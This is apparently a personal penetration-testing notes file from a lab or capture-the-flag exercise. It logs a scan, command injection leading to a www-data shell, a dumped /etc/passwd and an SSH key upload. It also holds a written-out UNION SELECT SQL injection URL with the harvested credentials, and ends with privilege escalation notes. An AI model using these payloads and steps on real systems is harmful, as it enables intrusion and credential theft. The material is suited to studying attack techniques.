@@ -1,0 +1,171 @@
+first hop >> 10.50.28.176;; ssh 10.50.28.176 -X 
+nikto -h IP
+robots.txt,/image/icons/readme, /Onlinetools**
+/onlinetools == command injection
+user == www-data 
+
+
+/etc/passwd for the 10.50.28.176
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:y7QWNQem0ND6kRz9bfg4:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+openupthedoor:x:1001:1001::/home/openupthedoor:/bin/bash
+
+
+only method rn in command injection 
+attempting ssh keygen 
+dont have creds yet hehehehe
+
+command injection ssh key upload successful 
+login as www-data 
+cant run sudo or change password (dont knwo it still lmao)
+
+
+ran for i in i script of 192.168.28 net 
+nmapped .30,177,182,190 
+
+Host is up (0.0016s latency).
+
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   closed ssh
+23/tcp   closed telnet
+80/tcp   closed http
+8080/tcp closed http-proxy
+
+Nmap scan report for 192.168.28.177
+Host is up (0.0051s latency).
+
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   open   ssh
+23/tcp   closed telnet
+80/tcp   closed http
+8080/tcp closed http-proxy
+
+Nmap scan report for 192.168.28.182
+Host is up (0.0026s latency).
+
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   open   ssh
+23/tcp   closed telnet
+80/tcp   open   http
+8080/tcp closed http-proxy
+
+Nmap scan report for 192.168.28.190
+Host is up (0.0019s latency).
+
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   closed ssh
+23/tcp   closed telnet
+80/tcp   closed http
+8080/tcp closed http-proxy
+
+Nmap done: 4 IP addresses (4 hosts up) scanned in 2.21 seconds
+
+looks like the .177 and the .182 are alive hosts 
+
+new website on the .182
+
+login page in russian gonna exploit dis hoe 
+
+Array
+(
+    [0] => Msmith
+    [name] => Msmith
+    [1] => Squanchy
+    [password] => Squanchy
+)
+1Array
+(
+    [0] => Fpalic
+    [name] => Fpalic
+    [1] => Birdperson
+    [password] => Birdperson
+)
+1Array
+(
+    [0] => Kmichae
+    [name] => Kmichae
+    [1] => MrMeeseeks
+    [password] => MrMeeseeks
+)
+1
+exploited dat hoe 
+
+got post request when logging in 
+"username" 
+"secpasswd"
+/onlinetools/ 
+searchbar doesnt return anything when attempting command injection + why would they have two instantces of cmd inj;;; must be sql lmaoooo
+
+attemptiong to ssh w/ creds found 
+no creds worked RIP
+
+/forces/forcespick.php
+vuln to the UNION SELECT thingy 
+Locations=10 is max gotta find one thats vuln
+locations=4 in vuln + there are 4 columns 
+
+http://localhost:11300/forces/forcespick.php?Locations=4%20UNION%20SELECT%20name,password,user,4%20FROM%20auth_users.logins
+
+Province 	            Rsanch            <name
+Civilian population 	ScaryTerry        <password
+Residing Unit 	      Rick Sanchez      <user
+Troop strength 	4
+Province 	            Msmith
+Civilian population 	Squanchy
+Residing Unit 	      Morty Smith
+Troop strength 	4
+Province 	            Fpalic
+Civilian population 	Birdperson
+Residing Unit 	      Frank Palicky
+Troop strength 	4
+Province 	            Kmichae
+Civilian population 	MrMeeseeks
+Residing Unit 	      Krombopulos Michael
+Troop strength 	4
+
+FPALIC FUCING WORKS HOLY SHIT 
+okay lesggo baby 
+
+PE file >> RE_this
+port_report.txt
+scp -P 11300 Fpalic@localhost:/home/devops/RE_this .
+
+linux exploit time 
+
+scp to windows doing ghdra shit rn wtf 
+binary analysis is trash figured out bitshifting 
+
+priv exc useing xargs and gtfo bins 
+found root home and nc script openign hte port 
